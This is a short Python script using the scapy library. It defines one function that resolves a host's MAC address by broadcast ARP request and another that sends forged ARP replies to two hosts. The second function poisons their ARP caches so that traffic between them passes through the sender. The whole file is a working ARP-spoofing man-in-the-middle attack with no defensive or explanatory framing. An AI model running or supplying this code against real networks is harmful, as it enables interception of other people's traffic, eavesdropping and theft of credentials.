from scapy.all import *

def find_mac(ip:str) -> str:
    arp_frame = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip)
    response, _ = srp(arp_frame)

    for _, x in response:
        return x[Ether].src

def poison_cache(host_1_ip:str, host_1_mac:str, host_2_ip:str, host_2_mac:str) -> None:
    send(ARP(op=2, pdst=host_1_ip, hwdst=host_1_mac, psrc=host_2_ip), verbose=0, count=1)
    send(ARP(op=2, pdst=host_2_ip, hwdst=host_2_mac, psrc=host_1_ip), verbose=0, count=1)